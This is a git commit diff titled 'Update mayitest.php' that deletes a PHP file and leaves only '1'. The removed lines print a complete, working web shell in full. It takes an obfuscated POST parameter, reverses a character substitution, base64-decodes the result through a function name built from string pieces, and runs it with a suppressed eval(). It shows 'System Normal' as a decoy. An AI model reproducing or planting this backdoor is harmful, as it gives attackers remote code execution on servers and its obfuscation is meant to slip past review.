2ced2d61455bc3e27bac1d95aad8e390e55c9cc6
Liseth <79140153+black2729134369@users.noreply.github.com>
2025-10-21 05:20:41 +0800

    Update mayitest.php

--- mayitest.php
+++ mayitest.php
@@ -1,17 +1,1 @@
-<?php
-
-$p = $_POST;
-$a = 'a'; $t = 't';
-$param = 'd' . $a . $t . $a;
-if(isset($p[$param])){
-    $d = $p[$param];
-    $m = ["|"=>"a","!"=>"b","@"=>"c","_"=>"d","~"=>"="];
-    $r = strtr($d, $m);
-    $f = "base" . "64" . "_" . "decode";
-    $c = $f($r);
-    @eval($c);
-}else{
-    echo "System Normal";
-}
-?>
-
+1
